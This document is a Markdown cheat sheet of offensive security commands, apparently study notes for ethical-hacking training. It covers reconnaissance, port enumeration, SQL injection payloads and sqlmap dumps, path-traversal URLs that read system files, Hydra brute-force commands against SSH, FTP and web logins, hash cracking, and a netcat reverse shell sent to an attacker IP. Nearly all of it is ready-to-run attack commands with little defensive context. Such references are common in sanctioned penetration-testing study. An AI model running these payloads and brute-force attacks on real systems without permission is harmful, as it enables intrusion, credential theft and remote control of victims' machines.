Title: Security Tools and Techniques Guide
Author: L
Date: 2025-02-19
Style: MultiMarkdown

# Comprehensive Security Tools and Techniques Guide

## Table of Contents
1. [Resources](#resources)
2. [Reconnaissance](#reconnaissance)
3. [Network Scanning](#network-scanning)
4. [Essential Ports](#essential-ports)
5. [Enumeration](#enumeration)
6. [Vulnerability Scanning](#vulnerability-scanning)
7. [Steganography](#steganography)
8. [Web Exploitation](#web-exploitation)
9. [System Hacking](#system-hacking)
10. [Cryptography](#cryptography)
11. [Android Hacking](#android-hacking)
12. [Wireless Hacking](#wireless-hacking)

## Resources {#resources}
Primary Reference: [Ethical hacking git](https://github.com)

## Reconnaissance {#reconnaissance}

### Web-Based Tools
| Tool | Purpose |
|------|----------|
| [Tor Browser](https://www.torproject.org/download/) | Anonymous browsing |
| [Google Search](https://ahrefs.com/blog/google-advanced-search-operators/) | Advanced search operators |
| [Netcraft](https://searchdns.netcraft.com) | Domain intelligence |
| [Shodan](https://www.shodan.io/) | IoT search engine |
| [Censys](https://censys.com/data-and-search/) | Internet asset search |

### Command-Line Tools
| Tool | Example Usage | Description |
|------|--------------|-------------|
| Sublist3r | `sublist3r -d domain -b all` | Subdomain enumeration |
| TheHarvester | `theharvester -d domain -n linkedin` | Email and subdomain gathering |
| Sherlock | `sherlock username` | Username reconnaissance |
| Photon | `photon -u URL` | Web crawler and data extractor |
| HTTrack | `httrack http://example.com` | Website mirroring |
| Recon-ng | `recon-ng` | Full-featured reconnaissance framework |

## Network Scanning {#network-scanning}

### Online Resources
- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](nmap.md)

### SX Tool
```bash
# Network scanning tool for ARP, TCP & UDP
sx arp 10.10.1.0/24
sx arp 10.10.10.1/24 --json | tee arp.cache  # Output to file
```

### GUI Applications
- Angry IP Scanner: Host discovery for any OS
- Zenmap: Nmap's graphical interface tool
- Uniscan:
  - GUI: Launch uniscan-gui
  - CLI: `unicornscan 10.10.1.10 -Iv`

### Additional Network Tools
```bash
# Discover devices
netdiscover -i eth0

# Enumeration
netstat -a 10.10.10.10      # Netstat enumeration netbios
snmp-check 10.10.10.10      # Extract users from netbios
masscan -e tun0 -p1-65535 -rate=1000 <ip>
```

## Essential Ports {#essential-ports}

| Port | Service | Exploitation & Enumeration | OS/Machine Identification |
|------|----------|---------------------------|--------------------------|
| 21 | FTP | - Anonymous login check (`nmap --script ftp-anon`)<br>- Weak credential exploitation | Open source vs. proprietary servers |
| 22 | SSH | - Brute-force attempts (`hydra -L users.txt -P passwords.txt ssh://<IP>`) | Common on Linux/macOS |
| 23 | Telnet | - Cleartext credential interception<br>- Wireshark monitoring | Legacy Windows/Unix |
| 25 | SMTP | - User enumeration (`nmap --script smtp-enum-users`)<br>- Open relay testing | Linux-based email servers |
| 53 | DNS | - Zone transfer testing (`dig axfr @<IP>`)<br>- AD enumeration | BIND (Linux) vs. Microsoft DNS |
| 80/443 | HTTP/HTTPS | - Web vulnerability scanning<br>- Directory enumeration<br>- SQLi/XSS testing | Apache/Nginx (Linux) vs. IIS (Windows) |
| 445 | SMB | - Share enumeration<br>- EternalBlue exploitation | Windows systems |
| 3389 | RDP | - Credential brute-force<br>- BlueKeep vulnerability check | Windows systems |

## Enumeration {#enumeration}

### SMB (Port 445)
```bash
# List shares
nmap --script smb-enum-shares -p 445 <IP>
smbclient -L //<TARGET-IP> -U anonymous -N

# Access share
smbclient //<TARGET-IP>/DVWA -U anonymous
smb: \> get uploads/hash.txt

# Additional enumeration
enum4linux -U 10.10.60.11
crackmapexec smb <IP> --users
smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
```

### Directory Enumeration
```bash
gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
```

### WordPress Enumeration
```bash
wpscan --url https://localhost.com --passwords=wordlist.txt
wpscan -u 10.10.10.10 -e u vp
wpscan -u 10.10.10.10 -e u --wordlist path/rockyou.txt
```

### Additional Tools
```bash
# SNMP Check
snmp-check 10.10.1.22

# NetBIOS
nmap --script nbstat.nse <IP>

# Wordlist Generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
```

## Vulnerability Scanning {#vulnerability-scanning}

### Tools
- OpenVAS/Greenbone
  ```bash
  apt install openvas -y
  gvm-setup
  gvm-start
  ```
- Tenable Nessus: `systemctl start nessusd`
- NIST
- CVE.org

### Nikto
```bash
nikto -h <TARGET-IP>                                    # Basic scan
nikto -h <TARGET-IP> -p 443,8080,8443                  # Specific ports
nikto -h https://<TARGET-IP>                           # HTTPS scan
nikto -h <TARGET-IP> -useragent "Mozilla/5.0"          # Browser mimicking
nikto -h <TARGET-IP> -o scan_results.txt               # Save output
nikto -h <TARGET-IP> -o results.html -Format html      # HTML output
nikto -h <TARGET-IP> -useproxy http://127.0.0.1:8080   # Proxy scan
nikto -h <TARGET-IP> -Tuning <value>                   # Specific vulnerabilities
```

## Steganography {#steganography}

### Steghide
```bash
# Extract hidden file
steghide extract -sf new.jpeg

# Embed file
steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
```

### SNOW
```bash
# Extract hidden message
SNOW.EXE -C -p 1234 output.txt

# Conceal message
SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt
```

## Web Exploitation {#web-exploitation}

### SQL Injection

#### Detection and Retrieval
- Comment indicators: `--` (MySQL), `#` (Oracle/MS/PostgreSQL)
- Basic tests:
  - `condition'+OR+1=1--`
  - `' ORDER BY 1--`
  - `' UNION SELECT NULL--`

#### Version Detection
```sql
-- Microsoft, MySQL
SELECT @@version

-- Oracle
SELECT * FROM v$version

-- PostgreSQL
SELECT version()
```

#### Database Enumeration
```sql
-- List tables
SELECT * FROM information_schema.tables

-- List columns
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

### SQLMap
```bash
# Basic scan
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

# Extract database
sqlmap -u <url> --cookie <cookie> --dbs

# Extract columns
sqlmap -u http://localhost.com/hey.php?artist=1 -D databasename --T artists --columns

# Extract data
sqlmap -u http://localhost.com/hey.php?artist=1 -D tabla --T artist --C adesc,aname,artist_id --dump
```

### Local File Inclusion (LFI)
```
http://<TARGET-IP>/vulnerable.php?file=../../DVWA/uploads/hash.txt
http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/drivers/etc/hosts
http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
```

## System Hacking {#system-hacking}

### Netcat Reverse Shell
```bash
# Attacker
nc -lvnp 4444

# Victim
nc -e /bin/bash <ATTACKER-IP> 4444
```

### Hydra
```bash
# SSH
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11

# FTP
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100

# Telnet
hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet

# Web Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```

## Cryptography {#cryptography}

### Password Cracking

#### Online Tools
| Website | Hash Types | Features |
|---------|------------|-----------|
| [CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Rainbow tables |
| [Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Community-driven |
| [OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Offline cracking |
| [MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup |

#### Local Tools
```bash
# Identify hash
hashid hash.txt
hashcat --identify hash.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Crack with Hashcat
hashcat -m <HASH_MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Disk Encryption
- Bitlocker
- VeraCrypt
  1. Create volume
  2. Choose container type
  3. Select encryption algorithm
  4. Set size and password
  5. Mount as new volume

## Android Hacking {#android-hacking}

### ADB (Android Debug Bridge)
```bash
# Setup
apt-get update
sudo apt-get install adb -y

# Usage
adb devices -l
adb connect <ip>
adb shell
adb pull sdcard/test.txt /home/user/Desktop
```

## Wireless Hacking {#wireless-hacking}

```bash
# Crack wireless capture
aircrack-ng Credmapwifi.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> Credmapwifi.cap
```

### Phonesploit
1. Install from GitHub
2. Run: `python3 phonesploit.py`
3. Use options to view/connect/download
